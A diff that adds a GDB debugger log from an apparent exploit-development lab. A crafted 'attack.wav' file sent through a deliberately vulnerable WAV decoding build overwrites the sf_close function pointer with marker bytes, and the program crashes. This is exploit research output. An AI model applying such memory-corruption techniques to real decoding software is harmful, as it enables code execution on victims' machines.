@@ -1,0 +1,11 @@
+Breakpoint 1 at 0x417109: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/drwav2shell/consumer/build/nopie-vuln/tests/wav/wav_decoding.c, line 326.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, decode_test_file (pFilePath=0x7fffffffdfa0 "tests/testvectors/wav/tests/attack.wav") at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/drwav2shell/consumer/build/nopie-vuln/tests/wav/wav_decoding.c:326
+326	    result = decode_test_file_s32(&libsndfile, &wav);
+TARGET_ADDR=0x41e118
+0x41e118 <libsndfile__sf_close>:	0x424242424841434b	0x0000000061746164
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
